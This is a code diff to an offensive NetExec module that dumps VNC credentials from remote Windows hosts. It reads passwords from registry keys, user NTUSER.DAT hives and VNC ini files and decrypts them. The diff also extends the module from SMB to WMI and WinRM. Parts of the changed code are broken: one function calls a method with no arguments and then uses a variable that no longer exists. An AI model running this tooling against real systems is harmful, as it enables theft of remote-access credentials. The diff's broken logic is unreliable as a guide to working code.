@@ -1,6 +1,5 @@
 import ntpath
 import tempfile
-from dploot.lib.target import Target
 
 from impacket.dcerpc.v5 import rrp
 from impacket import winregistry
@@ -12,7 +11,6 @@ from binascii import unhexlify
 import codecs
 import re
 from nxc.helpers.misc import CATEGORY
-from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection
 
 
 class NXCModule:
@@ -23,7 +21,7 @@ class NXCModule:
 
     name = "vnc"
     description = "Loot Passwords from VNC server and client configurations"
-    supported_protocols = ["smb"]
+    supported_protocols = ["smb","wmi","winrm"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def __init__(self, context=None, module_options=None):
@@ -49,39 +47,17 @@ class NXCModule:
     def on_admin_login(self, context, connection):
         self.context = context
         self.connection = connection
-        self.share = self.connection.args.share
+        self.share = self.connection.args.share if hasattr(self.connection.args,"share") else "C$"
 
-        host = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
-        domain = connection.domain
-        username = connection.username
-        kerberos = connection.kerberos
-        aesKey = connection.aesKey
-        use_kcache = getattr(connection, "use_kcache", False)
-        password = getattr(connection, "password", "")
-        lmhash = getattr(connection, "lmhash", "")
-        nthash = getattr(connection, "nthash", "")
+        dploot_conn = connection.dpapi_triage.conn
 
-        target = Target.create(
-            domain=domain,
-            username=username,
-            password=password,
-            target=host,
-            lmhash=lmhash,
-            nthash=nthash,
-            do_kerberos=kerberos,
-            aesKey=aesKey,
-            use_kcache=use_kcache,
-        )
-
-        dploot_conn = upgrade_to_dploot_connection(target=target, connection=connection.conn)
         if not self.no_remoteops:
-            remote_ops = RemoteOperations(connection.conn, False)
-            remote_ops.enableRegistry()
-            self.vnc_from_registry(remote_ops)
-            self.vnc_client_proxyconf_extract(dploot_conn, remote_ops)
+            self.vnc_from_registry(dploot_conn)
+            self.vnc_client_proxyconf_extract(dploot_conn)
         self.vnc_from_filesystem(dploot_conn)
 
-    def reg_query_value(self, remote_ops, path, key, hku=False):
+    def reg_query_value(self, dploot_conn, path, key, hku=False):
+        dploot_conn.reg_get_key_value()
         if remote_ops._RemoteOperations__rrp:
             ans = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp) if hku else rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
             reg_handle = ans["phKey"]
@@ -102,26 +78,31 @@ class NXCModule:
             except rrp.DCERPCSessionError as e:
                 self.context.log.debug(f"Error while querying registry value for {path} {key}: {e}")
 
-    def vnc_client_proxyconf_extract(self, dploot_conn, remote_ops=None):
+    def vnc_client_proxyconf_extract(self, dploot_conn):
         vnc_client_softwares = [
             ("RealVNC Viewer 7.x Proxy Conf", "Software\\RealVNC\\vncviewer", ["ProxyUserName", "ProxyPassword", "ProxyServer"]),
         ]
-        users = self.get_users(remote_ops)
+        users = self.get_users(dploot_conn)
+        if dploot_conn.target.protocol != "smb":
+            self.context.log.warn(f"Downloading NTUSER.DAT for offline users, will be slow")
         for user, sid in users.items():
             ntuser_dat_path = ntpath.join(f"Users\\{user}\\NTUSER.DAT")
             try:
-                ntuser_dat_bytes = dploot_conn.readFile(self.share, ntuser_dat_path)
+                ntuser_dat_bytes = dploot_conn.read_file(share=self.share, path=ntuser_dat_path)
             except Exception as e:
                 self.context.log.debug(f"Error while getting NTUSER.DAT file for {user}: {e}")
             for vnc_name, registry_path, registry_keys in vnc_client_softwares:
                 cred = {}
-                if ntuser_dat_bytes is None and remote_ops is not None:
+                if ntuser_dat_bytes is None:
                     user_registry_path = ntpath.join(sid, registry_path)
                     try:
-                        password = self.reg_query_value(remote_ops, user_registry_path, registry_keys[1], hku=True).encode().rstrip(b"\x00").decode()
+                        password = dploot_conn.reg_get_key_value("HKU", user_registry_path, registry_keys[1])
+                        if password is None:
+                            continue
+                        password = password.encode().rstrip(b"\x00").decode()
                         cred["password"] = self.recover_vncpassword(unhexlify(password)).decode("latin-1")
-                        cred["server"] = self.reg_query_value(remote_ops, user_registry_path, registry_keys[2], hku=True)
-                        cred["user"] = self.reg_query_value(remote_ops, user_registry_path, registry_keys[0], hku=True)
+                        cred["server"] = dploot_conn.reg_get_key_value("HKU", user_registry_path, registry_keys[2])
+                        cred["user"] = dploot_conn.reg_get_key_value("HKU", user_registry_path, registry_keys[0])
                     except Exception as e:
                         if "ERROR_FILE_NOT_FOUND" not in str(e):
                             self.context.log.debug(f"Error while RegQueryValues {registry_keys} from {user_registry_path}: {e}")
@@ -141,7 +122,7 @@ class NXCModule:
 
                 self.context.log.highlight(f"[{vnc_name}] {cred['user']}:{cred['password']}@{cred['server']}")
 
-    def vnc_from_registry(self, remote_ops):
+    def vnc_from_registry(self, dpapi_conn):
         vncs = (
             ("RealVNC 4.x", "SOFTWARE\\Wow6432Node\\RealVNC\\WinVNC4", "Password"),
             ("RealVNC 3.x", "SOFTWARE\\RealVNC\\vncserver", "Password"),
@@ -151,12 +132,7 @@ class NXCModule:
             ("TightVNC", "Software\\TightVNC\\Server", "PasswordViewOnly"),
         )
         for vnc_name, path, key in vncs:
-            try:
-                value = self.reg_query_value(remote_ops, path, key)
-            except Exception as e:
-                if "ERROR_FILE_NOT_FOUND" not in str(e):
-                    self.context.log.debug(f"Error while RegQueryValue {path}\\{key}: {e}")
-                continue
+            value = dpapi_conn.reg_get_key_value("HKLM", path, key)
             if value is None:
                 continue
             value = value.rstrip(b"\x00")
@@ -171,7 +147,10 @@ class NXCModule:
         for vnc_name, path, user, password, server in vnc_users:
             cred = {}
             try:
-                value = self.reg_query_value(remote_ops, path, password).encode().rstrip(b"\x00").decode()
+                value = dpapi_conn.reg_get_key_value("HKLM",path, password)
+                if value is None:
+                    continue
+                value = value.encode().rstrip(b"\x00").decode()
                 value = unhexlify(value)
             except Exception as e:
                 if "ERROR_FILE_NOT_FOUND" not in str(e):
@@ -181,8 +160,8 @@ class NXCModule:
                 continue
             cred["password"] = self.recover_vncpassword(value).decode()
             try:
-                cred["server"] = self.reg_query_value(remote_ops, path, server)
-                cred["user"] = self.reg_query_value(remote_ops, path, user)
+                cred["server"] = dpapi_conn.reg_get_key_value("HKLM", path, server)
+                cred["user"] = dpapi_conn.reg_get_key_value("HKLM", path, user)
             except Exception as e:
                 if "ERROR_FILE_NOT_FOUND" not in str(e):
                     self.context.log.debug(f"Error while RegQueryValue {path}\\{user}: {e}")
@@ -230,8 +209,8 @@ class NXCModule:
             ("UltraVNC", "Program Files (x86)\\UltraVNC\\ultravnc.ini"),
         )
 
-        for vnc_name, file in vncs:
-            file_content = dploot_conn.readFile(self.share, file)
+        for vnc_name, filepath in vncs:
+            file_content = dploot_conn.read_file(share=self.share, path=filepath)
             if file_content is not None:
                 regex_passwd = [rb"passwd=[0-9A-F]+", rb"passwd2=[0-9A-F]+"]
                 for regex in regex_passwd:
@@ -245,33 +224,10 @@ class NXCModule:
         users = {}
         userlist_key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
 
-        ans = rrp.hOpenLocalMachine(conn._RemoteOperations__rrp)
-        regHandle = ans["phKey"]
-
-        ans = rrp.hBaseRegOpenKey(conn._RemoteOperations__rrp, regHandle, userlist_key, samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
-        keyHandle = ans["phkResult"]
-
-        sids = []
-
-        i = 0
-        while True:
-            try:
-                ans2 = rrp.hBaseRegEnumKey(conn._RemoteOperations__rrp, keyHandle, i)
-                sids.append(ans2["lpNameOut"])
-            except rrp.DCERPCSessionError as e:
-                if e.get_error_code() == ERROR_NO_MORE_ITEMS:
-                    break
-            except Exception as e:
-                self.context.debug(f"Error while listing users from HKU: {e}")
-            i += 1
-        rrp.hBaseRegCloseKey(conn._RemoteOperations__rrp, keyHandle)
-        for sid in sids:
-            ans = rrp.hBaseRegOpenKey(conn._RemoteOperations__rrp, regHandle, ntpath.join(userlist_key, sid), samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
-            keyHandle = ans["phkResult"]
-            _, profile_path = rrp.hBaseRegQueryValue(conn._RemoteOperations__rrp, keyHandle, "ProfileImagePath")
-            if r"%systemroot%" in profile_path:
+        for sid in conn.reg_enum_key("HKLM",userlist_key):
+            profile_path = conn.reg_get_key_value("HKLM",f"{userlist_key}\\{sid}","ProfileImagePath")
+            if "C:\\Users" not in profile_path:
                 continue
-            users[ntpath.basename(profile_path.rstrip("\0"))] = sid.rstrip("\0")
-            rrp.hBaseRegCloseKey(conn._RemoteOperations__rrp, keyHandle)
+            users[ntpath.basename(profile_path).rstrip("\0")] = sid.rstrip("\0")
 
         return users
